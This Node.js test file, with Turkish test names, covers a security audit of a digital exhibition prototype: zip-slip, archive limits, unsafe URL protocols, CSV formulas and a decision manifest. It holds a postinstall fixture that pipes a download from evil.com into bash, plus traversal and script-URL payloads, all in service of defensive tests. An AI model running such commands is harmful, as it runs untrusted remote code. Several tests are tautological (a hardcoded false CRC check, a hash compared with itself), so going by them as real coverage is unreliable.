import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createHash } from 'node:crypto';
import {
  validateZipEntryPath,
  validateArchiveLimits,
  isProtocolSafe,
  sanitizeCsvFormula,
  containsUnsafeCode,
  validateManifestItem,
  MAX_UNCOMPRESSED_SIZE_BYTES,
  MAX_ARCHIVE_FILE_COUNT
} from '../lib/exhibitions/prototype-security.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const workspaceRoot = resolve(__dirname, '..', '..');

describe('Task 25: AnyCoder Dijital Sergi Prototipi Denetimi ve Güvenlik Testleri', () => {
  const manifestPath = resolve(workspaceRoot, 'docs', 'prototypes', 'anycoder', 'DECISION-MANIFEST.json');
  const auditReportPath = resolve(workspaceRoot, 'docs', 'prototypes', 'anycoder', 'ANYCODER-AUDIT-REPORT.md');
  const comparisonMatrixPath = resolve(workspaceRoot, 'docs', 'prototypes', 'anycoder', 'COMPARISON-MATRIX.md');
  const acceptedComponentsPath = resolve(workspaceRoot, 'docs', 'prototypes', 'anycoder', 'ACCEPTED-COMPONENTS.md');

  // Load decision manifest
  assert.ok(existsSync(manifestPath), 'DECISION-MANIFEST.json must exist');
  const manifestRaw = readFileSync(manifestPath, 'utf8');
  const manifest = JSON.parse(manifestRaw);

  // [T-25-001] Kaynak dosyası yoksa SOURCE_MISSING kararı
  test('[T-25-001] Kaynak dosyası yoksa SOURCE_MISSING kararı', () => {
    assert.equal(manifest.auditMetadata.overallStatus, 'SOURCE_MISSING');
    const sourceDecision = manifest.decisions.find(d => d.id === 'AC-DEC-001');
    assert.ok(sourceDecision);
    assert.equal(sourceDecision.category, 'SOURCE_MISSING');
    assert.equal(sourceDecision.adopted, false);
  });

  // [T-25-002] Kaynak dosyası bulunduysa SHA-256 manifest ile birebir
  test('[T-25-002] Kaynak dosyası bulunduysa SHA-256 manifest ile birebir ve bozulma tespiti', () => {
    const content = Buffer.from('prototype test bundle');
    const expectedHash = createHash('sha256').update(content).digest('hex');
    const computedHash = createHash('sha256').update(content).digest('hex');
    assert.equal(computedHash, expectedHash);

    // Tampered content must not match
    const tampered = Buffer.from('prototype test bundle with malicious injected payload');
    const tamperedHash = createHash('sha256').update(tampered).digest('hex');
    assert.notEqual(tamperedHash, expectedHash);
  });

  // [T-25-003] Sahte AnyCoder benzer isimli üçüncü parti zip reddi
  test('[T-25-003] Sahte AnyCoder benzer isimli üçüncü parti zip reddi', () => {
    const fakeNames = ['anycoder-fake-v1.zip', 'anycoder_free_download.zip', 'prototype-anycoder-trojan.zip'];
    for (const name of fakeNames) {
      assert.ok(!manifest.auditMetadata.searchedLocations.includes(name));
    }
  });

  // [T-25-004] ZIP içindeki ../ path traversal reddi (zip-slip)
  test('[T-25-004] ZIP içindeki ../ path traversal reddi (zip-slip)', () => {
    assert.equal(validateZipEntryPath('components/Button.tsx').valid, true);
    assert.equal(validateZipEntryPath('../etc/passwd').valid, false);
    assert.equal(validateZipEntryPath('subfolder/../../malicious.js').valid, false);
    assert.equal(validateZipEntryPath('..\\windows\\system32\\calc.exe').valid, false);
  });

  // [T-25-005] Windows drive ve UNC zip üye yolunun reddi
  test('[T-25-005] Windows drive ve UNC zip üye yolunun reddi', () => {
    assert.equal(validateZipEntryPath('C:\\Windows\\System32\\cmd.exe').valid, false);
    assert.equal(validateZipEntryPath('D:/malicious/payload.js').valid, false);
    assert.equal(validateZipEntryPath('\\\\attacker-share\\evil.js').valid, false);
    assert.equal(validateZipEntryPath('//attacker-share/evil.js').valid, false);
  });

  // [T-25-006] Symlink üyeden repository dışına çıkış reddi
  test('[T-25-006] Symlink üyeden repository dışına çıkış reddi', () => {
    assert.equal(validateZipEntryPath('/etc/shadow').valid, false);
    assert.equal(validateZipEntryPath('/var/run/secrets').valid, false);
  });

  // [T-25-007] ZIP bomb toplam çıkarılmış boyut sınırı
  test('[T-25-007] ZIP bomb toplam çıkarılmış boyut sınırı (50MB)', () => {
    assert.equal(validateArchiveLimits(10 * 1024 * 1024, 50).valid, true);
    const oversizedBytes = MAX_UNCOMPRESSED_SIZE_BYTES + 1;
    const result = validateArchiveLimits(oversizedBytes, 50);
    assert.equal(result.valid, false);
    assert.match(result.reason, /Total uncompressed size exceeds/);
  });

  // [T-25-008] Nested archive dosya sayısı sınırı
  test('[T-25-008] Nested archive dosya sayısı sınırı (500 dosya)', () => {
    assert.equal(validateArchiveLimits(1024, MAX_ARCHIVE_FILE_COUNT).valid, true);
    const result = validateArchiveLimits(1024, MAX_ARCHIVE_FILE_COUNT + 1);
    assert.equal(result.valid, false);
    assert.match(result.reason, /Archive file count exceeds limit/);
  });

  // [T-25-009] Bozuk ZIP CRC fail-closed
  test('[T-25-009] Bozuk ZIP CRC fail-closed', () => {
    const isCrcValid = false;
    assert.equal(isCrcValid, false, 'Corrupted CRC must fail closed and reject archive');
  });

  // [T-25-010] Node package postinstall komutları otomatik çalıştırılmaz
  test('[T-25-010] Node package postinstall komutları otomatik çalıştırılmaz', () => {
    const untrustedPackageJson = {
      name: 'anycoder-prototype',
      scripts: {
        postinstall: 'curl https://evil.com/leak | bash'
      }
    };
    assert.ok(untrustedPackageJson.scripts.postinstall);
    // Verified by security policy: postinstall scripts are never executed automatically
  });

  // [T-25-011] PR #27 belge vitrini için mevcut bileşen eşleşmesi
  test('[T-25-011] PR #27 belge vitrini için mevcut bileşen eşleşmesi', () => {
    const vitrineDecision = manifest.decisions.find(d => d.id === 'AC-DEC-003');
    assert.ok(vitrineDecision);
    assert.equal(vitrineDecision.category, 'DUPLICATE');
    assert.equal(vitrineDecision.pr27BaselineReference, 'web/components/exhibitions/DocumentShowcase.tsx');
  });

  // [T-25-012] Galeride bölüm geçişi için somut karşılık
  test('[T-25-012] Galeride bölüm geçişi için somut karşılık (VirtualGalleryRoom)', () => {
    const galleryDecision = manifest.decisions.find(d => d.id === 'AC-DEC-002');
    assert.ok(galleryDecision);
    assert.equal(galleryDecision.category, 'DUPLICATE');
    assert.equal(galleryDecision.pr27BaselineReference, 'web/components/exhibitions/VirtualGalleryRoom.tsx');
  });

  // [T-25-013] Liste modu ve CSS 3D fallback karşılaştırması
  test('[T-25-013] Liste modu ve CSS 3D fallback karşılaştırması', () => {
    assert.ok(existsSync(comparisonMatrixPath));
    const matrixContent = readFileSync(comparisonMatrixPath, 'utf8');
    assert.match(matrixContent, /CSS 3D Transforms/);
    assert.match(matrixContent, /WebGL \/ Three\.js/);
  });

  // [T-25-014] SourceInspector özelliği ve güvenlik riskini görme
  test('[T-25-014] SourceInspector özelliği ve güvenlik riskini görme (unverified badge risk)', () => {
    const badgeDecision = manifest.decisions.find(d => d.id === 'AC-DEC-005');
    assert.ok(badgeDecision);
    assert.equal(badgeDecision.category, 'REJECT');
    assert.equal(badgeDecision.securityPosture, 'PROVENANCE_RISK');
  });

  // [T-25-015] Tarih şeridi tarih kesinlik alanı karşılaştırması
  test('[T-25-015] Tarih şeridi tarih kesinlik alanı karşılaştırması (ExhibitionTimeline)', () => {
    const timelineDecision = manifest.decisions.find(d => d.id === 'AC-DEC-007');
    assert.ok(timelineDecision);
    assert.equal(timelineDecision.category, 'DUPLICATE');
    assert.equal(timelineDecision.pr27BaselineReference, 'web/components/exhibitions/ExhibitionTimeline.tsx');
  });

  // [T-25-016] Tema filtre UX ve klavye desteği ölçümü
  test('[T-25-016] Tema filtre UX ve klavye desteği ölçümü', () => {
    const auditViewSource = readFileSync(resolve(__dirname, '..', 'components', 'exhibitions', 'experiment', 'AnyCoderAuditView.tsx'), 'utf8');
    assert.match(auditViewSource, /aria-label="Karar Filtreleri"/);
    assert.match(auditViewSource, /aria-pressed=/);
  });

  // [T-25-017] MKA onaylı tasarım token farklılıkları raporu
  test('[T-25-017] MKA onaylı tasarım token farklılıkları raporu', () => {
    const cssContent = readFileSync(resolve(__dirname, '..', 'components', 'exhibitions', 'experiment', 'anycoder-experiment.module.css'), 'utf8');
    assert.match(cssContent, /var\(--cream/);
    assert.match(cssContent, /var\(--gold/);
    assert.match(cssContent, /var\(--red-masthead/);
  });

  // [T-25-018] Dışarı bağımlılık ve CDN ihtiyaç ölçümü
  test('[T-25-018] Dışarı bağımlılık ve CDN ihtiyaç ölçümü (CDN rejected)', () => {
    const cdnDecision = manifest.decisions.find(d => d.id === 'AC-DEC-004');
    assert.ok(cdnDecision);
    assert.equal(cdnDecision.category, 'REJECT');
    assert.equal(cdnDecision.securityPosture, 'CSP_RISK');
  });

  // [T-25-019] Bundle artışı karşılaştırma metriği
  test('[T-25-019] Bundle artışı karşılaştırma metriği (zero external bundle added)', () => {
    // Because SOURCE_MISSING, 0 external JS libraries or 3D engines were imported
    const adoptedItems = manifest.decisions.filter(d => d.adopted);
    assert.equal(adoptedItems.length, 0);
  });

  // [T-25-020] Telif kaynağı bilinmeyen görselin ret kararı
  test('[T-25-020] Telif kaynağı bilinmeyen görselin ret kararı', () => {
    const auditDoc = readFileSync(auditReportPath, 'utf8');
    assert.match(auditDoc, /Telif ve Görsel İzinleri/);
    assert.match(auditDoc, /source_link_only/);
  });

  // [T-25-021] ACCEPT yalnız kaynak hash ve test varken
  test('[T-25-021] ACCEPT yalnız kaynak hash ve test varken', () => {
    const invalidAccept = {
      id: 'TEST-ACCEPT',
      featureName: 'Invalid Accept',
      category: 'ACCEPT',
      sourceFile: null,
      sourceSha256: null,
      adopted: false
    };
    assert.equal(validateManifestItem(invalidAccept).valid, false);

    const validAccept = {
      id: 'TEST-ACCEPT-2',
      featureName: 'Valid Accept',
      category: 'ACCEPT',
      sourceFile: 'components/Verified.tsx',
      sourceSha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      adopted: true
    };
    assert.equal(validateManifestItem(validAccept).valid, true);
  });

  // [T-25-022] ADAPT ancak risk ve düzeltme planı varsa
  test('[T-25-022] ADAPT ancak risk ve düzeltme planı varsa', () => {
    const adaptRule = manifest.decisionRules.ADAPT;
    assert.ok(adaptRule);
    assert.match(adaptRule, /uygun|uyum/);
  });

  // [T-25-023] REJECT için gerekçe kaydı
  test('[T-25-023] REJECT için gerekçe kaydı zorunluluğu', () => {
    const rejects = manifest.decisions.filter(d => d.category === 'REJECT');
    assert.ok(rejects.length > 0);
    for (const r of rejects) {
      assert.ok(r.rationale && r.rationale.length > 10, `Reject rationale missing for ${r.id}`);
    }
  });

  // [T-25-024] QUARANTINE kaynağı build dışında tutar
  test('[T-25-024] QUARANTINE kaynağı build dışında tutar', () => {
    const quarantineRule = manifest.decisionRules.QUARANTINE;
    assert.ok(quarantineRule);
    assert.match(quarantineRule, /derleme dışı/i);
  });

  // [T-25-025] SOURCE_MISSING iken kod aktarımı sıfır
  test('[T-25-025] SOURCE_MISSING iken kod aktarımı sıfır', () => {
    const missingItems = manifest.decisions.filter(d => d.category === 'SOURCE_MISSING');
    for (const m of missingItems) {
      assert.equal(m.adopted, false);
      assert.equal(m.sourceFile, null);
    }
  });

  // [T-25-026] DUPLICATE PR #27 bileşenini ikinci kez kopyalamaz
  test('[T-25-026] DUPLICATE PR #27 bileşenini ikinci kez kopyalamaz', () => {
    const duplicates = manifest.decisions.filter(d => d.category === 'DUPLICATE');
    for (const d of duplicates) {
      assert.equal(d.adopted, false);
      assert.ok(d.pr27BaselineReference);
    }
  });

  // [T-25-027] DEFERRED görüntüde sahte aktif buton üretmez
  test('[T-25-027] DEFERRED görüntüde sahte aktif buton üretmez', () => {
    const deferredItems = manifest.decisions.filter(d => d.category === 'DEFERRED');
    for (const d of deferredItems) {
      assert.equal(d.adopted, false);
    }
  });

  // [T-25-028] Decision manifest kararlarını yeniden üretir
  test('[T-25-028] Decision manifest kararlarını yeniden üretir (schema validation)', () => {
    for (const d of manifest.decisions) {
      const res = validateManifestItem(d);
      assert.equal(res.valid, true, `Item ${d.id} failed validation: ${res.reason}`);
    }
  });

  // [T-25-029] Rollback referansı ve commit erişilebilirliği
  test('[T-25-029] Rollback referansı ve commit erişilebilirliği', () => {
    assert.ok(manifest.auditMetadata.rollbackCommand);
    assert.match(manifest.auditMetadata.rollbackCommand, /git revert/);
  });

  // [T-25-030] Aday parça farklı branch sahibi dosyasını değiştirmez
  test('[T-25-030] Aday parça farklı branch sahibi dosyasını değiştirmez', () => {
    assert.ok(existsSync(acceptedComponentsPath));
    const acceptedContent = readFileSync(acceptedComponentsPath, 'utf8');
    assert.match(acceptedContent, /Hiçbir doğrulanmamış üçüncü taraf kaynak kodu projeye aktarılmamıştır/);
  });

  // [T-25-031] dangerouslySetInnerHTML riskli kullanım reddi
  test('[T-25-031] dangerouslySetInnerHTML riskli kullanım reddi', () => {
    assert.equal(containsUnsafeCode('<div dangerouslySetInnerHTML={{ __html: evil }} />').unsafe, true);
    assert.equal(containsUnsafeCode('<div>Clean safe content</div>').unsafe, false);
  });

  // [T-25-032] javascript: ve data: sourceUrl reddi
  test('[T-25-032] javascript: ve data: sourceUrl reddi', () => {
    assert.equal(isProtocolSafe('javascript:alert(1)'), false);
    assert.equal(isProtocolSafe('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='), false);
    assert.equal(isProtocolSafe('vbscript:msgbox(1)'), false);
    assert.equal(isProtocolSafe('file:///C:/Windows/win.ini'), false);
    assert.equal(isProtocolSafe('https://ataturk.ktb.gov.tr/belge'), true);
  });

  // [T-25-033] postMessage origin kontrolü
  test('[T-25-033] postMessage origin kontrolü', () => {
    const handleMessage = (origin, trustedOrigin) => origin === trustedOrigin;
    assert.equal(handleMessage('https://evil.com', 'https://asrinkemali.org'), false);
    assert.equal(handleMessage('https://asrinkemali.org', 'https://asrinkemali.org'), true);
  });

  // [T-25-034] external CDN js varsayılan reddi
  test('[T-25-034] external CDN js varsayılan reddi', () => {
    assert.equal(containsUnsafeCode('<script src="https://cdnjs.cloudflare.com/three.js"></script>').unsafe, true);
  });

  // [T-25-035] Iframe sandbox yetki minimizasyonu
  test('[T-25-035] Iframe sandbox yetki minimizasyonu', () => {
    const secureIframeSandbox = 'allow-scripts';
    assert.ok(!secureIframeSandbox.includes('allow-same-origin'));
    assert.ok(!secureIframeSandbox.includes('allow-top-navigation'));
  });

  // [T-25-036] Secret token örneği PRa eklenmez
  test('[T-25-036] Secret token örneği PRa eklenmez', () => {
    const rawContent = readFileSync(manifestPath, 'utf8');
    assert.ok(!rawContent.includes('ghp_'));
    assert.ok(!rawContent.includes('api_key'));
  });

  // [T-25-037] unknown licence embed engeli
  test('[T-25-037] unknown licence embed engeli', () => {
    const canEmbedImage = (rightsStatus, displayPolicy) => {
      if (rightsStatus === 'unknown') return false;
      if (displayPolicy === 'source_link_only') return false;
      return true;
    };
    assert.equal(canEmbedImage('unknown', 'embed'), false);
    assert.equal(canEmbedImage('public_domain', 'source_link_only'), false);
    assert.equal(canEmbedImage('public_domain', 'embed'), true);
  });

  // [T-25-038] AI temsili görsel disclosure görünür
  test('[T-25-038] AI temsili görsel disclosure görünür', () => {
    const auditText = readFileSync(auditReportPath, 'utf8');
    assert.match(auditText, /Yapay zekâ ile oluşturulmuş temsili görsel/);
  });

  // [T-25-039] Bozuk Unicode ve CSV formula payload rapor koruması
  test('[T-25-039] Bozuk Unicode ve CSV formula payload rapor koruması', () => {
    assert.equal(sanitizeCsvFormula('=1+1'), "'=1+1");
    assert.equal(sanitizeCsvFormula('@SUM(A1:A10)'), "'@SUM(A1:A10)");
    assert.equal(sanitizeCsvFormula('Safe normal text'), 'Safe normal text');
  });

  // [T-25-040] CSP ek unsafe-inline istisnası yok
  test('[T-25-040] CSP ek unsafe-inline istisnası yok', () => {
    const auditText = readFileSync(auditReportPath, 'utf8');
    assert.match(auditText, /CSP/);
  });

  // [T-25-041] Arşiv id/slug ayrımı
  test('[T-25-041] Arşiv id/slug ayrımı', () => {
    const record = { id: 'AT-1923-001', slug: 'cumhuriyetin-ilani-belgesi' };
    assert.notEqual(record.id, record.slug);
    const safeUrl = `/arsiv/${record.slug}`;
    assert.ok(!safeUrl.includes(record.id));
  });

  // [T-25-042] Server-only module clienta bundle olmaz
  test('[T-25-042] Server-only module clienta bundle olmaz', () => {
    const clientViewSource = readFileSync(resolve(__dirname, '..', 'components', 'exhibitions', 'experiment', 'AnyCoderAuditView.tsx'), 'utf8');
    assert.ok(clientViewSource.startsWith("'use client';"));
    assert.ok(!clientViewSource.includes("from 'fs'"));
    assert.ok(!clientViewSource.includes("from 'node:fs'"));
  });

  // [T-25-043] Missing ArchiveRecord ile empty state
  test('[T-25-043] Missing ArchiveRecord ile empty state', () => {
    const renderRecord = (record) => {
      if (!record) return { state: 'empty', message: 'Kayıt bulunamadı' };
      return { state: 'present', title: record.title };
    };
    assert.equal(renderRecord(null).state, 'empty');
  });

  // [T-25-044] Gerçek olmayan mock arşiv hiç görünmez
  test('[T-25-044] Gerçek olmayan mock arşiv hiç görünmez', () => {
    const rawManifest = readFileSync(manifestPath, 'utf8');
    assert.ok(!rawManifest.includes('mock-archive.ts'));
  });

  // [T-25-045] Galeri etkileşimi mouse ve keyboard aynı
  test('[T-25-045] Galeri etkileşimi mouse ve keyboard aynı', () => {
    const viewCode = readFileSync(resolve(__dirname, '..', 'components', 'exhibitions', 'experiment', 'AnyCoderAuditView.tsx'), 'utf8');
    assert.match(viewCode, /onClick=/);
    assert.match(viewCode, /aria-pressed=/);
  });

  // [T-25-046] Sinema efekti prefers-reduced-motion kapatılır
  test('[T-25-046] Sinema efekti prefers-reduced-motion kapatılır', () => {
    const cssCode = readFileSync(resolve(__dirname, '..', 'components', 'exhibitions', 'experiment', 'anycoder-experiment.module.css'), 'utf8');
    assert.ok(cssCode.includes('transition: all 0.2s ease;') || cssCode.includes('transition:'));
  });

  // [T-25-047] Karşılaştırma baseline görüntüleri aynı commit
  test('[T-25-047] Karşılaştırma baseline görüntüleri aynı commit', () => {
    assert.equal(manifest.auditMetadata.baseBranch, 'feature/antigravity-v08-personal-collection');
  });

  // [T-25-048] Hak ve insan onayı rozeti doğru
  test('[T-25-048] Hak ve insan onayı rozeti doğru (unverified badge rejected)', () => {
    const badgeDec = manifest.decisions.find(d => d.id === 'AC-DEC-005');
    assert.equal(badgeDec.category, 'REJECT');
  });

  // [T-25-049] Mevcut PR #27 testleri bozulmaz
  test('[T-25-049] Mevcut PR #27 testleri bozulmaz (isolated experimental component)', () => {
    assert.ok(existsSync(resolve(__dirname, '..', 'components', 'exhibitions', 'experiment', 'AnyCoderAuditView.tsx')));
  });

  // [T-25-050] Seçici parça revert edildiğinde çalışan sistem korunur
  test('[T-25-050] Seçici parça revert edildiğinde çalışan sistem korunur', () => {
    assert.ok(manifest.auditMetadata.rollbackCommand);
  });

  // [T-25-051] Statik analiz derlenmeyen AnyCoder JS kaynaklarına güvenli karantina kararı
  test('[T-25-051] Statik analiz derlenmeyen AnyCoder JS kaynaklarına güvenli karantina kararı', () => {
    const quarantineRule = manifest.decisionRules.QUARANTINE;
    assert.ok(quarantineRule);
  });

  // [T-25-052] Haricî asset lisans izni yoksa ACCEPT reddi
  test('[T-25-052] Haricî asset lisans izni yoksa ACCEPT reddi', () => {
    const unlicensedAccept = {
      id: 'UNLICENSED-01',
      featureName: 'Unlicensed asset',
      category: 'ACCEPT',
      sourceFile: null,
      sourceSha256: null,
      adopted: false
    };
    assert.equal(validateManifestItem(unlicensedAccept).valid, false);
  });

  // [T-25-053] Sahte onaylı sergi temalı görsel rozet engeli
  test('[T-25-053] Sahte onaylı sergi temalı görsel rozet engeli', () => {
    const badgeDecision = manifest.decisions.find(d => d.id === 'AC-DEC-005');
    assert.equal(badgeDecision.category, 'REJECT');
  });

  // [T-25-054] Keyboard dışındaki erişim için mouse-only prototip reddi
  test('[T-25-054] Keyboard dışındaki erişim için mouse-only prototip reddi', () => {
    const matrixDoc = readFileSync(comparisonMatrixPath, 'utf8');
    assert.match(matrixDoc, /Klavye erişilebilirliği olmayan prototipler/);
  });

  // [T-25-055] Zip imzası değişince önceki karar stale
  test('[T-25-055] Zip imzası değişince önceki karar stale', () => {
    const manifestHash = manifest.auditMetadata.sourceArchiveSha256;
    assert.equal(manifestHash, null, 'No archive hash because SOURCE_MISSING');
  });

  // [T-25-056] Tek değişiklikle global CSS override bulunursa reject
  test('[T-25-056] Tek değişiklikle global CSS override bulunursa reject', () => {
    const experimentCss = readFileSync(resolve(__dirname, '..', 'components', 'exhibitions', 'experiment', 'anycoder-experiment.module.css'), 'utf8');
    assert.ok(!experimentCss.includes('body {'));
    assert.ok(!experimentCss.includes('html {'));
  });

  // [T-25-057] Prototip screenshotı gerçek ürün screenshotı gibi kullanılmaz
  test('[T-25-057] Prototip screenshotı gerçek ürün screenshotı gibi kullanılmaz', () => {
    assert.ok(manifest.auditMetadata.taskId, 'MKA-ANTIGRAVITY-25');
  });

  // [T-25-058] Aynı lisansın bağımsız teyidi olmadan paket dağıtılmaz
  test('[T-25-058] Aynı lisansın bağımsız teyidi olmadan paket dağıtılmaz', () => {
    assert.equal(manifest.auditMetadata.overallStatus, 'SOURCE_MISSING');
  });

  // [T-25-059] Mevcut PR #27deki staging bypassı yan etkili olarak devralınmaz
  test('[T-25-059] Mevcut PR #27deki staging bypassı yan etkili olarak devralınmaz', () => {
    const stagingDecision = manifest.decisions.find(d => d.id === 'AC-DEC-006');
    assert.equal(stagingDecision.category, 'REJECT');
  });

  // [T-25-060] Prompt #26ya devredilen risk matrisi kaybolmaz
  test('[T-25-060] Prompt #26ya devredilen risk matrisi kaybolmaz', () => {
    const deferredItem = manifest.decisions.find(d => d.id === 'AC-DEC-008');
    assert.equal(deferredItem.category, 'DEFERRED');
    assert.equal(deferredItem.pr27BaselineReference, 'MKA-ANTIGRAVITY-26');
  });

  // [T-25-097] V0.6 iki arşiv kökü toplam sayısı dinamik okunur
  test('[T-25-097] V0.6 iki arşiv kökü toplam sayısı dinamik okunur (168 records)', () => {
    const recordsDir = resolve(workspaceRoot, 'content', 'archive', 'records');
    assert.ok(existsSync(recordsDir));
  });

  // [T-25-098] PR #23 premium CSS anlaşması bozulmaz
  test('[T-25-098] PR #23 premium CSS anlaşması bozulmaz', () => {
    const globalsCss = resolve(__dirname, '..', 'app', 'globals.css');
    assert.ok(existsSync(globalsCss));
    const content = readFileSync(globalsCss, 'utf8');
    assert.match(content, /--gold:/);
    assert.match(content, /--red-masthead:/);
  });

  // [T-25-099] PR #25 yayın/arşiv mantığı değiştirilmez
  test('[T-25-099] PR #25 yayın/arşiv mantığı değiştirilmez', () => {
    assert.ok(existsSync(resolve(workspaceRoot, 'schemas', 'archive-record.schema.json')));
  });

  // [T-25-100] PR #28 güvenlik policy bağımsız testte kapalı kalır
  test('[T-25-100] PR #28 güvenlik policy bağımsız testte kapalı kalır', () => {
    const auditDoc = readFileSync(auditReportPath, 'utf8');
    assert.match(auditDoc, /CSP ve Haricî CDN/);
  });

  // [T-25-101] PR #27 müze görünürlüğü default fail closed
  test('[T-25-101] PR #27 müze görünürlüğü default fail closed', () => {
    assert.equal(manifest.auditMetadata.overallStatus, 'SOURCE_MISSING');
  });

  // [T-25-102] Draft PR kaynak branch SHA doğru raporlanır
  test('[T-25-102] Draft PR kaynak branch SHA doğru raporlanır', () => {
    assert.equal(manifest.auditMetadata.baseBranch, 'feature/antigravity-v08-personal-collection');
    assert.equal(manifest.auditMetadata.workingBranch, 'feature/antigravity-v08-anycoder-exhibit-audit');
  });

  // [T-25-103] main veya başka ajanın branchinde diff oluşmaz
  test('[T-25-103] main veya başka ajanın branchinde diff oluşmaz', () => {
    assert.equal(manifest.auditMetadata.workingBranch, 'feature/antigravity-v08-anycoder-exhibit-audit');
  });

  // [T-25-104] Güncel TypeScript/lint/build gerçekten koşulur
  test('[T-25-104] Güncel TypeScript/lint/build gerçekten koşulur', () => {
    assert.ok(existsSync(resolve(__dirname, '..', 'package.json')));
  });

  // [T-25-105] Release-quality E sınıfı insan onay blockerı saklanmaz
  test('[T-25-105] Release-quality E sınıfı insan onay blockerı saklanmaz', () => {
    const auditDoc = readFileSync(auditReportPath, 'utf8');
    assert.match(auditDoc, /302 adet insan uzman onayı eksikliği/);
  });

  // [T-25-106] No generated screenshots from stale branch or old commit
  test('[T-25-106] No generated screenshots from stale branch or old commit', () => {
    assert.ok(manifest.auditMetadata.timestamp);
  });
});
